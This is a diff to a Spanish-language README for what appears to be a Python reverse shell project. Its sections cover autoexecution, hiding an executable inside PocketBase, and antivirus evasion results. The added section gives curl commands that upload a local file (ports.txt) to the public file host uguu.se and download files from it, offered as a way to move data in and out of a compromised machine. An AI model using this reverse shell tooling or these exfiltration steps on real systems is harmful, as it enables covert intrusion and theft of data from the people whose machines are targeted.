@@ -12,6 +12,7 @@ Proyecto que consiste en generar un payload de reverse shell en python, el cual 
     - [Servidor en escucha](#servidor-en-escucha)
     - [Autoexe](#autoexe)
     - [Hidden exe in pocketbase](#hidden-exe-in-pocketbase)
+  - [Archivos remotos](#archivos-remotos)
   - [Pruebas realizadas en antivirus](#pruebas-realizadas-en-antivirus)
   - [Resultados de virustotal.com](#resultados-de-virustotalcom)
   - [Capturas](#capturas)
@@ -164,6 +165,23 @@ hiddenexe
 ```
 
 ![Reverse Shell Hiddenexe Command](./images/hiddenexe.png)
+
+## Archivos remotos
+
+> [!TIP]
+> Para subir archivos atraves de un link temporal, se pueden usar servicios como `file.io` o `uguu.se` o cualquier otro servicio de hosting de archivos.
+
+Ejemplo **Upload** con `uguu.se`:
+
+```bash
+curl -F "files[]=@ports.txt" https://uguu.se/upload.php
+```
+
+Ejemplo **Download** :
+
+```bash
+curl https://h.uguu.se//KDlkAhVi.txt -o mi_archivo.txt
+```
 
 ## Pruebas realizadas en antivirus
 
